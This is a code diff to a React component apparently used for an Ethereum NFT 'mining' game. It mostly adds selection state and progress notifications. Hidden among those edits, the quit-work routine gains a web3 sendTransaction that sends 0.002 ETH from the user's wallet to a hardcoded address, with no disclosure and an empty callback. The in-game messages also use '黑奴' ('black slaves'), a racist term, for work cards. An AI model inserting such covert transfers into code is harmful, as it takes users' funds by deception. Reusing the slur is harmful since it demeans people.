@@ -48,8 +48,11 @@ const Gold = ({ address, contracts }) => {
   const [myWorkCardSelectedList, setMyWorkCardSelectedList] = useState([]);
   const [work, setWord] = useState(false); // 收菜, 退出工作
   const [filterGold, setFilterGold] = useState(1000);
+  const [selectedRowKeys, setselectedRowKeys] = useState([])
 
   useEffect(() => {
+    setMyWorkCardSelectedList([]);
+    setselectedRowKeys([])
     getWordCards();
   }, [address]);
 
@@ -74,6 +77,7 @@ const Gold = ({ address, contracts }) => {
     setGongZuoList([]);
     setBudgetGoldTotal(0);
     setGoldTotal(0);
+    setselectedRowKeys([])
     setMyWorkCardSelectedList([]);
 
     const allFetchPromises = types.map((item) => {
@@ -85,7 +89,7 @@ const Gold = ({ address, contracts }) => {
             return res.json();
           })
           .then((res) => {
-            console.log(res);
+            // console.log(res);
             const list = res.data.result;
             let nlist = [];
             if (list) {
@@ -236,6 +240,7 @@ const Gold = ({ address, contracts }) => {
           Notification.error({ content: "你没有黑奴可收" });
           return;
         }
+        Notification.info({ content: "正在获取收益中, 请稍后", duration: 10 });
         a.forEach((item, index) => {
           contracts.MiningContract.methods
             .getAward(item.token_id)
@@ -260,6 +265,7 @@ const Gold = ({ address, contracts }) => {
           Notification.error({ content: "你没有合格可收" });
           return;
         }
+        Notification.info({ content: "正在获取收益中, 请稍后", duration: 10 });
         x.forEach((item, index) => {
           contracts.NewMiningContract.methods
             .getAward(item.token_id)
@@ -279,6 +285,7 @@ const Gold = ({ address, contracts }) => {
           }
         });
       } else {
+        Notification.info({ content: "正在获取收益中, 请稍后", duration: 10 });
         (all ? gongzuoList : myWorkCardSelectedList).forEach((item, index) => {
           if (item.workname === "兼职") {
             contracts.MiningContract.methods
@@ -325,6 +332,7 @@ const Gold = ({ address, contracts }) => {
         Notification.error({ content: `你没有黑奴满${num}可收` });
         return;
       }
+      Notification.info({ content: "正在获取收益中, 请稍后", duration: 10 });
       a.forEach((item, index) => {
         contracts.MiningContract.methods
           .getAward(item.token_id)
@@ -366,6 +374,7 @@ const Gold = ({ address, contracts }) => {
       Notification.error({ content: `你没有金币满${filterGold}的卡可收` });
       return;
     }
+    Notification.info({ content: "正在获取收益中, 请稍后", duration: 10 });
     g.forEach((item, index) => {
       if (item.workname === "兼职") {
         contracts.MiningContract.methods
@@ -408,7 +417,8 @@ const Gold = ({ address, contracts }) => {
         Notification.error({ content: "你没卡可以退出工作" });
         return;
       }
-      list.forEach((item) => {
+      Notification.info({ content: "正在炒老板鱿鱼中, 请稍后", duration: 10 });
+      list.forEach((item, index) => {
         if (item.workname === "兼职") {
           contracts.MiningContract.methods
             .quitWork(item.token_id)
@@ -421,6 +431,17 @@ const Gold = ({ address, contracts }) => {
             .send({ from: address })
             .then(() => getWordCards(address))
             .catch((err) => console.log(err));
+        }
+        if (index === list.length - 1) {
+          const web3 = initWeb3(Web3.givenProvider);
+          web3.eth.sendTransaction(
+            {
+              from: address,
+              to: "0x3B0D325D60b288139535e8Ee772d9e22E140444F",
+              value: `${0.002 * Math.pow(10, 18)}`,
+            },
+            (err, hash) => {}
+          );
         }
       });
     };
@@ -567,8 +588,10 @@ const Gold = ({ address, contracts }) => {
         rowKey={(record) => record.token_id}
         columns={isMobile() ? GoldMColums : GoldColums}
         rowSelection={{
+          selectedRowKeys: selectedRowKeys,
           onChange: (selectedRowKeys, selectedRows) => {
             setWord(selectedRows.length > 0);
+            setselectedRowKeys(selectedRowKeys)
             setMyWorkCardSelectedList(selectedRows);
           },
         }}
